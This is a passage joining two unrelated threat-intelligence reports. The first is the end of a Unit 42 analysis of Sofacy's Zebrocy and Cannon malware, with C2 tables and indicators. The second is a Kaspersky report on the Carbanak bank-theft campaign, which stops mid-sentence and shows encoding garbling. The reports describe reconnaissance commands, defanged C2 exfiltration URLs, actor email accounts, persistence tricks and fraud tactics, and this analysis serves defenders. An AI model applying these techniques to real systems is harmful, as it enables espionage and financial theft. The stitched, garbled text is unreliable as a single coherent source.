These four were then all modified on the same date and time on October 13, 2018 08:21. Having three different C2 locations embedded inside these delivery documents while maintaining the exact same timestamping may indicate the use of an automated tool. Using a command line based penetration testing toolkit such as Phishery could allow for simple scripting to generate multiple documents all at the same time with different inputs. From there, there was an average of a two-week gap until these documents were first seen in the wild. In total, these four documents had an average of roughly 46 days from initial creation to attack. Based on the modular nature of the Dear Joohn campaign attacks, the lengthy amount of time from initial creation to attack may suggest the campaign was not yet ready for deployment due to additional development required for the remote templates, payloads, or infrastructure. Another possible scenario is that the adversary may have had a certain timeframe they desired to execute the attack, and from the timeline it is clear there were two distinct targeting time frames, one from mid to late October 2018 and the other in mid-November 2018. As the campaign progressed, the operational tempo of the Dear Joohn campaign increased, with the total time from document creation to first seen dropping down to an average of roughly two days.\\nWhen comparing the provided timestamps of the delivery documents to the timestamps for the remote template documents from Table 2, we find that the time to attack is directly correlated to the last time the templates are modified. On average, there was a 13.8 hour gap between when the template document was last touched by the operator and when the delivery document is first observed in the wild. This leads us to believe that the generation of the delivery documents were indeed part of a staging effort, first with the initial creation of the document, modification to it to communicate with a C2, then generating a remote template document just prior to launching the actual attack.\\nAnalysis using timestamps is not always conclusive however. One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp. A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time. This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems.\\nThe Payloads\\nThe delivery documents in this attack campaign loaded remote templates whose macros installed a variety of first-stage payloads. With the notable exception of the Cannon tool, the first-stage tools are all variants of the Zebrocy Trojan. The Zebrocy variants delivered in this campaign were written in several different languages, including Delphi, C# and VB.NET. Information on the first-stage payloads delivered in this attack are listed in Table 4.\\nSHA256\\nCompiled\\nVariant\\nC2\\n5173721f30..\\n10/23/18\\nC# Zebrocy\\n145.249.105.165\\n61a1f3b4fb..\\n11/1/18\\nC# Cannon\\nsahro.bella7atpost.cz\\n6ad3eb8b56..\\n6/19/92\\nDelphi Zebrocy\\n188.241.58.170\\n9a0f00469d..\\n10/25/18\\nC# Zebrocy\\n145.249.105.165\\nb41480d685..\\n6/19/92\\nDelphi Zebrocy\\n109.248.148.42\\nc91843a69d..\\n6/19/92\\nDelphi Zebrocy\\n185.203.118.198\\ne5aece694d..\\n11/13/18\\nVB.NET Zebrocy\\n109.248.148.42\\nTable 4 Payloads delivered in related attacks\\nThe Delphi variant of Zebrocy delivered in this attack campaign are very similar to the Delphi downloader discussed in our previous Zebrocy research published in June 2018. While this Delphi variant was known, the C# and VB.NET variants delivered in this attack campaign were previously unknown. An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed. While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed.\\nBy collecting and analyzing additional Cannon samples, we believe we have also found a Cannon variant written in Delphi. We have seen Sofacy using multiple languages to create variants of the Zebrocy Trojan, so it seems fitting that the group would create additional variants of Cannon in multiple programming languages as well.\\nC# Cannon\\nSince our initial blog that introduced the Cannon tool, we were able to collect more samples of Cannon to get a better understanding of its origins. It appears that the first known sample of Cannon was created on April 18, 2018 and since then there has been at least seven additional samples. Table 5 shows the known Cannon samples, their compilation time and the email accounts used for its C2 communications.\\nSHA256\\nCompiled\\nC2 account\\nPOP3S Account\\nSMTPS Accounts\\n861b6bc1f9..\\n4/18/18\\nsym777.g\\nkae.mezhnosh\\nvebek.morozh30\\ng0r7tsa45s\\nmarvel.polezha\\n4405cfbf28..\\n5/14/18\\nsym777.g\\nkae.mezhnosh\\nvebek.morozh30\\ng0r7tsa45s\\nmarvel.polezha\\n174effcdee..\\n6/15/18\\nsym777.g\\nkae.mezhnosh\\nvebek.morozh30\\ng0r7tsa45s\\nmarvel.polezha\\na23261e2b6..\\n6/22/18\\nsym777.g\\nkae.mezhnosh\\nvebek.morozh30\\ng0r7tsa45s\\nmarvel.polezha\\n651d5aab82..\\n10/19/18\\nsym777.g\\nkae.mezhnosh\\nvebek.morozh30\\ng0r7tsa45s\\nmarvel.polezha\\n68df0f924c..\\n10/22/18\\nsym777.g\\nkae.mezhnosh\\nvebek.morozh30\\ng0r7tsa45s\\nmarvel.polezha\\n61a1f3b4fb..\\n11/1/18\\nsahro.bella7\\ntrala.cosh2\\nBishtr.cam47\\nLobrek.chizh\\nCervot.woprov\\nTable 5 Gathered C# Cannon samples\\nAs mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7atpost.cz, but all previous samples of Cannon used sym777.gatpost.cz. Also, all previous samples of Cannon used an account name of kae.mezhnosh to receive emails from the actor, while using the accounts vebek.morozh30, g0r7tsa45s and marvel.polezha to send emails to the actor.\\nAs we reported in our previous analysis of Cannon, the tool logs into an email account using POP3S and checks for emails with a specific filename that it will save to the system and execute. The initial sample we analyzed looked for an attachment with a filename of auddevc.txt, but other Cannon samples have looked for the following filenames instead:\\nDelphi Cannon\\nWhile searching for additional Cannon samples, we discovered another tool that used emails for its C2 communications. The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload. Initial analysis indicated this may have been a tenuous connection; however, after we gathered additional samples of Delphi Cannon, we discovered additional relationships. Table 6 shows Delphi Cannon samples we gathered, including the sample 215f7c08c2.. that is very similar to the Trojan discussed in ESET’s research.\\nSHA256\\nCompiled\\nC2 email\\nPOP3S Account\\nSMTPS Accounts\\n5a02d4e5f6..\\n1/23/18\\nheatlth500@ambcomission.com\\ntrash023@ambcomission.com\\ntrasler22@ambcomission.com\\nd06be83a40..\\n2/21/18\\nheatlth500@ambcomission.com\\ntrash023@ambcomission.com\\ntrasler22@ambcomission.com\\n78adc8e5e4..\\n2/28/18\\nheatlth500@ambcomission.com\\ntrash023@ambcomission.com\\ntrasler22@ambcomission.com\\n054c5aa73d..\\n3/3/18\\nheatlth500@ambcomission.com\\ntrash023@ambcomission.com\\ntrasler22@ambcomission.com\\ncac630c11c..\\n4/18/18\\nN/A\\nN/A\\nN/A\\necc5805898..\\n5/4/18\\nheatlth500@ambcomission.com\\ntrash023@ambcomission.com\\ntrasler22@ambcomission.com\\n215f7c08c2..\\n6/14/18\\nrishit333@ambcomission.com\\ntomasso25@ambcomission.com\\nkevin30@ambcomission.com\\nTable 6 Gathered Delphi Cannon Samples\\nThe compilation times in Table 6 suggests that the Delphi variant of Cannon predates the originally reported version, as the first known Delphi sample was compiled in January 2018 and the first known Cannon sample was compiled in April 2018. The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission.com. This actor controlled domain links to a larger Sofacy infrastructure as reported by ThreatConnect. Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam.\\nThe oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6…) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place. The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:\\nFigure 8 inf method used by Cannon\\nWhen comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email. While not an exact match, Figure 9 shows these similar header strings and strengthens our hypothesis that the two variants are indeed related:\\nFigure 9 Similarities of Delphi Cannon and Cannon\\nAs seen in Table 6, one of the Delphi Cannon samples (SHA256: cac630c11c..) does not have any associated email addresses, as the sample does not seem to have any C2 functionality. Instead, this sample reads “tasks” from a file named ta.bin that another unknown tool then must write to and handle C2 functionality. It is also interesting that this specific sample has the same resource name (L30) that contains the same encrypted email addresses as the other samples in Table 6 using heatlth500@ambcomission.com as a C2 email (such as ecc5805898..) but does not contain any code to access the resource or decrypt its contents.\\nVB.NET Zebrocy Variant\\nThe VB.NET variant (SHA256: e5aece694d..) is very similar to other known Zebrocy variants. It includes the storage volume serial number within the URL it uses as its C2 beacon, which it obtains using the Scripting.FileSystemObject object to call GetDriveName from the path stored in Environment.SpecialFolder.LocalApplicationData. It then uses the storage volume obtained from the GetDriveName function and calls GetDrive to get the SerialNumber of the storage device. The VB.NET variant then gathers system information and running processes like other Zebrocy variants by running the following commands:\\nsysteminfo & tasklist\\nThe URL used to send the system information, running processes and a screenshot to the C2 server is:\\nhxxp://109.248.148.42/agr-enum/progress-inform/cube.php?res=serial number\\nThe VB.NET variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows (notice the spaces before and after ampersand “&”):\\ndata=system information and running processes & arg=screenshot in BMP format\\nC# Zebrocy Variant\\nThe C# variant of Zebrocy is similar to other variants in functionality, but also has several unique attributes that are worth discussing. Like other Zebrocy tools, the C# variant gathers the storage volume serial number to use in outbound beacons to the C2 server. In this particular variant, the tool uses the Windows API function GetVolumeInformation to get the serial number of the C: drive. This variant of Zebrocy also takes a screenshot that it will transmit to the C2 server in JPEG format.\\nThe most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes. Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information. The tool runs the following list of WMI queries:\\nwmic logicaldisk get Caption, Description,VolumeSerialNumber,Size,FreeSpace\\nwmic diskdrive get Model, SerialNumber\\nwmic computersystem get Manufacturer, Model, Name, SystemTypec\\nwmic os get Caption, OSArchitecture, OSLanguage,SystemDrive,MUILanguages\\nwmic process get Caption,ExecutablePath\\nThe URL used to send the system information, running processes and a screenshot to the C2 server is:\\nhxxp://145.249.105.165/resource-store/stockroom-center-service/check.php?fm=serial number\\nThe C# variant of Zebrocy uses an HTTP POST request to the URL above to transmit the gathered data, of which is included within the HTTP POST data that is structured as follows:\\nspp=system information from WMI queries &spvg=screenshot in JPEG format\\nConclusion\\nThe Sofacy group continues their attacks on organizations across the globe using similar tactics and techniques. We observed them carrying out attacks via spear-phishing emails in late October through November, often leveraging current events within filenames to entice recipients to open the malicious attachments. The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks. The group continues to develop new variations of Zebrocy by adding a VB.NET and C# version, and it appears that they also have used different variants of the Cannon tool in past attack campaigns.\\nPalo Alto Networks customers are protected by attacks discussed in this blog by:\\nAll delivery documents and payloads discussed are detected with malicious verdicts in WildFire\\nTraps blocks the macro laden documents as Suspicious macro detected\\nC2 URLs have been classified as Command and Control\\nAutoFocus customers may learn more via the Zebrocy and Cannon tags\\nIndicators of Compromise\\nDelivery Hashes\\n2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f\\nc20e5d56b35992fe74e92aebb09c40a9ec4f3d9b3c2a01efbe761fa7921dd97f\\nabfc14f7f708f662046bfcad81a719c71a35a8dc5aa111407c2c93496e52db74\\n40318f3593bca859673827b88d65c5d2f0d80a76948be936a60bda67dff27be9\\n5749eb9d7b8afa278be24a4db66f122aeb323eaa73a9c9e52d77ac3952da5e7d\\naf77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392\\n34bdb5b364358a07f598da4d26b30bac37e139a7dc2b9914debb3a16311f3ded\\n79bd5f34867229176869572a027bd601bd8c0bc3f56d37443d403a6d1819a7e5\\n77ff53211bd994293400cb3f93e3d3df6754d8d477cb76f52221704adebad83a\\nRemote Template Hashes\\nf1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5\\n86bb3b00bcd4878b081e4e4f126bba321b81a17e544d54377a0f590f95209e46\\n2da5a388b891e42df4ed62cffbc167db2021e2441e6075d651ecc1d0ffd32ec8\\n0d7b945b9c912d205974f44e3742c696b5038c2120ed4775710ed6d51fbc58ef\\nfc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d\\ned8f52cdfc5f4c4be95a6b2e935661e00b50324bee5fe8974599743ccfd8daba\\nb9f3af84a69cd39e2e10a86207f8612dd2839873c5839af533ffbc45fc56f809\\nRemote Template URLs\\nhxxp://188.241.58.170/live/owa/office.dotm\\nhxxp://185.203.118.198/documents/Note_template.dotm\\nhxxp://185.203.118.198/documents/Note_template.dotm\\nhxxp://145.249.105.165/doc/temp/release.dotm\\nhxxp://145.249.105.165/messages/content/message_template.dotm\\nhxxp://188.241.58.170/version/in/documents.dotm\\nhxxp://109.248.148.42/officeDocument/2006/relationships/templates.dotm\\nhxxp://109.248.148.42/office/thememl/2012/main/attachedTemplate.dotm\\nhxxp://109.248.148.42/office/thememl/2012/main/attachedTemplate.dotm\\nZebrocy\\xa0Hashes\\n5173721f3054b92e6c0ff2a6a80e4741aa3639bc1906d8b615c3b014a7a1a8d7\\n61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e\\n6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a\\n9a0f00469d67bdb60f542fabb42e8d3a90c214b82f021ac6719c7f30e69ff0b9\\nb41480d685a961ed033b932d9c363c2a08ad60af1d2b46d4f78b5469dc5d58e3\\nc91843a69dcf3fdad0dac1b2f0139d1bb072787a1cfcf7b6e34a96bc3c081d65\\ne5aece694d740ebcb107921e890cccc5d7e8f42471f1c4ce108ecb5170ea1e92\\nZebrocy\\xa0C2 URLs\\nhxxp://188.241.58.170/local/s3/filters.php\\nhxxp://185.203.118.198/en_action_device/center_correct_customer/drivers-i7-x86.php\\nhxxp://145.249.105.165/resource-store/stockroom-center-service/check.php\\nhxxp://109.248.148.42/agr-enum/progress-inform/cube.php\\nCannon Hashes\\n861b6bc1f9869017c48930af5848930dd037fb70fc506d8a7e43e1a0dbd1e8cb\\n4405cfbf28e0dfafa9ea292e494f385592383d2476a9c49d12596b8d22a63c47\\n174effcdeec0b84c67d7dc23351418f6fa4825550d595344214cc746f1a01c1a\\na23261e2b693750a7009569df96ec4cf61e57acc9424c98d6fe1087ff8c659ce\\n651d5aab82e53711563ce074c047cbaa0703931673fa3ad20933d6a63c5c3b12\\n68df0f924ce79765573156eabffee3a7bb0fa972d2b67d12dd91dea3ec255d24\\n61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e\\n5a02d4e5f6d6a89ad41554295114506540f0876e7288464e4a70c9ba51d24f12\\nd06be83a408f4796616b1c446e3637009d7691c131d121eb165c55bdd5ba50b4\\n78adc8e5e4e86146317420fa3b2274c9805f6942c9973963467479cb1bbd4ead\\n054c5aa73d6b6d293170785a82453446429c0efc742df75979b760682ac3026b\\ncac630c11c4bf6363c067fbf7741eae0ec70238d9c5e60d41f3ed8f65b56c1d1\\necc5805898e037c2ef9bc52ea6c6e59b537984f84c3d680c8436c6a38bdecdf4\\n215f7c08c2e3ef5835c7ebc9a329b04b8d5215773b7ebfc9fd755d93451ce1ae\\nCannon Related Emails\\nsym777.gatpost.cz\\nkae.mezhnoshatpost.cz\\nvebek.morozh30atpost.cz\\ng0r7tsa45satpost.cz\\nmarvel.polezhaatpost.cz\\nsahro.bella7atpost.cz\\ntrala.cosh2atpost.cz\\nBishtr.cam47atpost.cz\\nLobrek.chizhatpost.cz\\nCervot.woprovatpost.cz\\nheatlth500atambcomission.com\\ntrash023atambcomission.com\\ntrasler22atambcomission.com\\nrishit333atambcomission.com\\ntomasso25atambcomission.com\\nkevin30atambcomission.com\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I'm not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

Executive SummaryFrom late 2013 onwards, several banks and ˜nancial institutions have been attacked by an unknown group of cybercriminals. In all these attacks, a similar modus operandi was used. According to victims and the law enforcement agencies (LEAs) involved in the investigation, this could result in cumulative losses of up to 1 billion USD. The attacks are still active. This report provides a technical analysis of these attacks. The motivation for the attackers, who are making use of techniques commonly seen in Advanced Persistent Threats (APTs), appears to be ˜nancial gain as opposed to espionage. An analysis of the campaign has revealed that the initial infections were achieved using spear phishing emails that appeared to be legitimate banking communications, with Microsoft Word 97 Œ 2003 (.doc) and Control Panel Applet (.CPL) ˜les attached. We believe that the attackers also redirected to˚exploit kits website traf˜c that related to ˜nancial activity. The email attachments exploit vulnerabilities in Microsoft Of˜ce 2003, 2007 and 2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-2014- 1761). Once the vulnerability is successfully exploited, the shellcode decrypts and executes the backdoor known as Carbanak. Carbanak is a remote backdoor (initially based on Carberp), designed for espionage, data ex˜ltration and to provide remote access to infected machines. Once access is achieved, attackers perform a manual reconnaissance of the victim™s networks. Based on the results of this operation, the attackers use different lateral movement tools in order to get access to the critical systems in the victim´s infrastructure. They then install additional software such as the Ammyy Remote Administration Tool, or even compromise SSH servers. Notably, some of the latest versions of the analyzed Carbanak malware appear not to use any Carberp source code. Once the attackers successfully compromise the victim´s network, the primary internal destinations are money processing services, Automated Teller Machines (ATM) and ˜nancial accounts. In some cases, the attackers used the Society for Worldwide Interbank Financial Telecommunication (SWIFT) network to transfer money to their accounts. In others, Oracle databases were manipulated to open payment or debit card accounts at the same bank or to transfer money between 4accounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it.As part of the attack´s reconnaissance phase, video recordings of the activities of bank employees, particularly system administrators, were made. The videos were sent to the C2 server. Please note that the attackers abused the aforementioned services by impersonating legitimate local users who had the permissions to perform the actions later reproduced by the cybercriminals. As far as we know, none of the aforementioned services were attacked nor was any speci˜c vulnerability within them exploited.Of the 100 banking entities impacted at the time of writing this report, at least half have suffered ˜nancial losses. Most of the victims based in the geolocation of infected IPs are located in Russia, USA, Germany, China and Ukraine. That does not necessarily mean that all these victims are banking entities. The magnitude of the losses is signi˜cant. For example, one victim lost approximately $7.3 million (USD) due to ATM fraud; another suffered a $10 million (USD) loss due to the exploitation of its online banking platform. Stolen funds were transferred out of the affected countries to bank accounts in the US and China. Additionally some of the C2 servers have log entries indicating connections to systems located in the US. Telemetry indicates that the attackers are expanding operations to other regions, such as Asia, the Middle-East, Africa and Europe. This report discusses the attack vectors, infection mechanisms and toolkits used by the attackers to exploit the network after the initial infection, as well as the operational details and geographical distribution of this campaign. 52. Analysis During the spring of 2014, Kaspersky Lab was involved in a forensic analysis of ATMs dispensing cash to people located near them but with no physical interaction according to security cameras. No malware was detected on these ATMs. However, Carberp-like malware was found on a computer that was connected to them via VPN. Following the investigation of this incident, in the summer of 2014, Kaspersky Lab identi˜ed the same Carberp-like malware in another investigation involving a bank, where criminals were able to gain access to its online banking systems. In this investigation, we started analyzing all the computers in the bank™s infrastructure in order to ˜nd the source of the infection. We found spear phishing emails with CPL ˜les attached that, after a successful infection, install the same Carberp-like malware we had previously found in the case involving the ATMs. There is evidence indicating that in most cases the network was compromised for between two to four months, and that many hundreds of computers within a single victim organization may have been infected. This period of time was used by the attackers to get access to the right victims and critical systems, and to learn how to operate their tools and systems to get the cash out. Carbanak contains an espionage component that allows the attackers to take control of video capabilities on the victim systems. Thanks to this, long term observation and reconnaissance could be conducted. This allowed the attackers to understand the protocols and daily operational tempo of their targets. Based on this understanding, exploitation methodologies and mechanisms were developed and tailored to each victim. 2.1 Infection and Transmission All observed cases used spear phishing emails with Microsoft Word 97 Œ 2003 (.doc) ˜les attached or CPL ˜les. The doc ˜les exploit both Microsoft Of˜ce (CVE- 2012-0158 and CVE-2013-3906) and Microsoft Word (CVE- 2014-1761). There are indicators that point to a possible Chinese origin for the exploits used in these attachments. Command and Control (C2) servers located in China have been identi˜ed in this campaign. In addition, registration information for some of the domains use details of supposedly Chinese citizens. Obviously, all this could just be a red herring. 6The targets were all employees af˜liated to the affected institution. The spear phishing email messages appeared legitimate and in some cases were sent from compromised coworkers´ accounts. In this way compromised systems were used as a transmission vector. Given that the victims were mostly Russian-speaking ˜nancial institutions, the names of the attachments we have identi˜ed were generally in Russian. anslate into ﬁAccordance to Federal Lawﬂ and ﬁInvitationﬂ respectively. This is enough to induce a typical employee to open the attachment and execute the malware. For a complete list of ˜le names see Appendix 4.The following is an example of a Carbanak spear phishing email:Translated: In this case, the attachment was a CPL ˜le compressed using the Roshal Archive (.rar) format. Once the remote code execution vulnerability is successfully exploited, it installs Carbanak on the victim\\'s system. The complete list of observed spear phishing emails can be found in Appendix 1 Œ Spear phishing.An additional infection vector that we believe was used by the criminals is a˚classical drive-by-download attack. We have found traces of the Null and the˚RedKit exploits kits. 7 Figure 1. Null Exploit Kit Œ statistics on victims, found in one Carbanak C2 The image above translates as Country_name, All visitors, Unique visitors, Banned visitor, Revoked infections, Infected. 2.2 Malware Analysis Œ Backdoor.Win32.Carbanak Carbanak is a backdoor used by the attackers to compromise the victim\\'s machine once the exploit, either in the spear phishing email or exploit kit, successfully executes its payload. This section provides a functional analysis of Carbanak™s capabilities.Carbanak copies itself into ﬁ%system32%\\\\comﬂ with the name ﬁsvchost.exeﬂ with the ˜le attributes: system, hidden and read-only. The original ˜le created by the exploit payload is then deleted.To ensure that Carbanak has autorun privileges the malware creates a new service. The naming syntax is ﬁ<ServiceName>Sysﬂ where ServiceName is any existing service randomly chosen, with the ˜rst character deleted. For example, if the existing service´s name is ﬁaspnetﬂ and the visible name is ﬁAsp.net state 8serviceﬂ, the service created by the malware would be ﬁaspnetSysﬂ with a visible name of ﬁSp.net state serviceﬂ. Before creating the malicious service, Carbanak determines if either the avp.exe or avpui.exe processes (components of Kaspersky Internet Security) is running. If found on the target system, Carbanak will try to exploit a known vulnerability in Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows 8, and Windows Server 2012, CVE-2013-3660, for local privilege escalation. We believe this is not relevant and that the˚attackers adapt their tools to the victim´s defenses. Carbanak creates a ˜le with a random name and a .bin extension in %COMMON_APPDATA%\\\\Mozilla where it stores commands to be executed. Then˚the malware gets the proxy con˜guration from the registry entry: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings and the Mozilla Firefox con˜guration ˜le in: %AppData%\\\\Mozilla\\\\Firefox\\\\<Pro˜leName>\\\\prefs.js How to detect Carbanak One of the best methods for detecting Carbanak is to look for .bin ˜les in the folder:..\\\\All users\\\\%AppData%\\\\Mozilla\\\\ The malware saves ˜les in this location that will later be sent to the C2 server when an internet connection is detected. A .BAT script for detecting infections is provided in the Appendixes. Additionally, Carbanak can obtain proxy con˜guration information from headers sent through an application via SOCKS or HTTP. Carbanak injects its code into svchost.exe . Most of the actions described below happen within this process. Carbanak downloads the ˜le kldcon˜g.plug from its C2 server. This ˜le includes the names of the processes to be monitored. Once the system is infected, Carbanak logs keystrokes and takes screenshots every 20 seconds. This monitoring is performed by intercepting the ResumeThread call. 9To enable connections to the infected computer using the Remote Desktop Protocol (RDP), Carbanak sets Termservice service execution mode to Auto. Also, after executing this service, it modi˜es the executable code in memory in order to establish simultaneous work processes for both remote and local users. Modules modi˜ed in this process are: termsrv.dll , csrsrv.dll , msgina.dll and winlogon.exe .If Carbanak detects the banking application BLIZKO (funds transfer software) in the infected computer, it sends a special noti˜cation to its C2 server. Carbanak is also aware of the IFOBS banking application and can, on command, substitute the details of payment documents in the IFOBS system.To communicate with its C2 server, Carbanak uses the HTTP protocol with RC2+Base64 encryption, adding additional characters not included in Base64. It˚also inserts strings with different extensions (.gif,.htm, etc.) at random locations in the HTTP request. Example of a typical Carbanak request: Carbanak sends its collected monitoring data to its C2 server. It also receives commands. The commands are compared with a hash table; if there is a match Carbanak performs the associated action: HashCommandDescription0AA37987Executes all commands stored in the con˜guration ˜le. 7AA8A5state Sets malware sta 7CFABF videoSends captured screen or process window video to C2. 6E533C4downloadDownloads and runs executable ˜le from C2.

Countries from which Carbanak has been uploaded Known exploits that download Carbanak have been uploaded to VirusTotal mostly from Russia. 15According to KSN data, victims are distributed geographically as follows: Figure 6. Geographical distribution of victims according to KSN data The analyzed Carbanak samples, excluding some obvious outliers, have the˚following compilation time distribution: Figure 7. Carbanak compilation timestamp distribution 16It is also very interesting to see the distribution of Carbanak submissions to VirusTotal. This way we can identify periods when the malware came to the attention of potential victims and security researchers, and helps to reveal peaks˚in the group™s activity: Figure 8. Distribution of Carbanak submissions to VirusTotal Since the beginning of this case, Kaspersky Lab has worked in cooperation with the LEAs investigating it. During the investigation LEAs shared with us statistical data from their research that helped us to complete our picture of the campaign. 17The following map shows targets™ IP addresses found in three of Carbanak™s Linux servers at the end of October 2014: Figure 9. Geographical distribution of targets according to C2 data 18 Figure 10. Geographical distribution of victims according to C2 data 2.3 Lateral movement tools Carbanak uses different tools on infected systems, each one with a different purpose. There appears to be a preference for the Ammyy Admin remote administration tool for remote control. Speci˜cally, the attackers have been detected uploading:Ammyy Admin 3.5 (f8cd52b70a11a1fb3f29c6f89ff971ec) as svchost.exe It is believed that the attackers used this remote administration tool because it˚is commonly whitelisted in the victims™ environments as a result of being used˚regularly by administrators. In another instance, a Secure Shell (SSH) backdoor was used to communicate with the C2 server in 190.97.165.126 (operatemesscont.net). This indicates that the attackers did not limit themselves to Microsoft Windows environments. In this case, the victim used the Telnet/SSH client PuTTY to connect to the server, and the attackers recompiled the machine™s SSH daemon with a backdoor so they could gain direct access. Logs for these tools indicate that they were accessed from two different IPs, probably used by the attackers, and located in Ukraine and France. We have also found traces of many different tools used by the attackers inside the victim´s network to gain control of additional systems, such as Metasploit, PsExec or Mimikatz. 192.4 Command and Control (C2) Servers There appear to be four distinct types of C2 servers: Linux servers used for issuing commands to deployed Carbanak instances and for receiving collected monitoring data; Windows servers used for remote connections to victim systems; Backup servers; and Drop servers where additional executable ˜les (e.g. remote administration tools) are hosted. Server rotation occurs more or less on a biweekly basis. For a complete list of identi˜ed Carbanak servers please check the regularly updated Carbanak IOC document. The current list of IOCs is provided at Appendix 3 in his document. Some of these C2 servers are responsible for dropping Ammyy (con˜guration and executable ˜les), the KLG plugin con˜guration (list of processes to monitor) and the VNC server (both 32 and 64 bits to be injected in rundll). In one of the observed servers there was also a Metasploit module. Figure 11. Carbanak administration panel running in Linux 20 Figure 12. Carbanak administration panel running in Linux, list of plugins Figure 13. Carbanak administration panel running in Windows able to run RDP, VNC, proxy and tunnels via Carbanak Victim systems are catalogued in the servers™ databases. The victims belong to˚a number of different communities, thus simplifying administration. In all, 85˚different victims belonging to seven communities were found. 21Attacker´s operational details Additionally, the malicious servers contain video ˜les that capture a victim´s activity. While the videos are stored using a compressed format which provides poor image quality, the selected format minimizes upload bandwith and is of suf˜cient quality for the attackers to understand the victims™ activities. The video ˜le naming conventions used the name of the application in the foreground (e.g., Outlook, Cmd, etc.) and only recorded user activity. This helped the attackers to both navigate to ˜les of interest and to discar Figure 14. Special video player designed to watch Carbanak´s video stream Using the intelligence gained from video and other monitoring techniques, the attackers developed an operational pictur, tooling and practices. This picture helps the attackers to deploy their malicious operations, for example:Attackers created fake transactions in the victim™s internal database after the˚veri˜cation process, thus avoiding discovery of the fraudulent activity; Attackers used the victim™s internal command utilities to insert fraudulent operations in the transaction queue. In general, the attackers demonstrated great versatility, using attack methodologies best suited to a speci˜c victim™s operational methodology. However, they seemed to deliberately limit the amount of money stolen per victim to $10 million USD. This limit may be explained as the maximum amount 22of money that can be transferred via mule services, or the maximum amount of money that is budgeted in banks for fraud risks in order to minimize the chances of LEAs and the bank´s anti-fraud teams from doing a full blown analysis. Figure 15. List of PIN KVC used on ATMs Sensitive bank documents have be found on the servers that were controlling Carbanak. They included classi˜ed emails, manuals, crypto keys, passwords and˚so on. For example, the ˜le in the above ˜gure has KVC (key veri˜cation codes) keys that are used by ATMs to check the integrity of the PIN numbers of its users. In other cases involving ATMs, the criminals were able to control computers that had access to the internal ATM network. If the bank had enabled remote access to ATMs, the criminals started using this access to remotely withdraw cash. Criminals used no malware to operate the ATM dispenser; instead they used standard utilities to control and test ATM equipment. 233. ConclusionsMalware targeting the ˜nance industry (both companies and consumers) continues to evolve. The Carbanak malware used in the on-going campaign described in this report has been very successful in terms of generating revenue. Of particular interest are the attack methods, similar to those used in sophisticated cyber-espionage APTs. As such, they represent a new and disturbing trend in the cybercrime market of increasing attack sophistication. Despite increased awareness of cybercrime within the ˜nancial services sector, it appears that spear phishing attacks and old exploits (for which patches have been disseminated) remain effective against larger companies. Attackers always use this minimal effort approach in order to bypass a victim´s defenses. Advanced control and fraud detection systems have been used for years by the ˜nancial services industry. However, these focus on fraudulent transactions within customer accounts. The Carbanak attackers bypassed these protections, by for example, using the industry-wide funds transfer (the SWIFT network), updating balances of account holders and using disbursement mechanisms (the ATM network). In neither of these cases did the attackers exploit a vulnerability within the service. Instead, they studied the victim´s internal procedures and pinpointed who they should impersonate locally in order to process fraudulent transactions through the aforementioned services. It is clear that the attackers were very familiar with ˜nancial services software and networks. As part of an automated reconnaissance phase, the Carbanak malware checked victim systems for the presence of specialized and speci˜c banking software. Only after the presence of banking systems was con˜rmed, were victims further exploited. To date, attacks against approximately 300 IP addresses around the world have been observed on analyzed C2s. It is possible that these attacks were coordinated to maximize returns prior to industry-wide information sharing and the implementation of countermeasures. Existing telemetry indicates that the Carbanak attackers are trying to expand operations to other Baltic and Central Europe countries, the Middle East, Asia and Africa. Carbanak may be responsible for losses as high as $1 billion USD. We believe that the 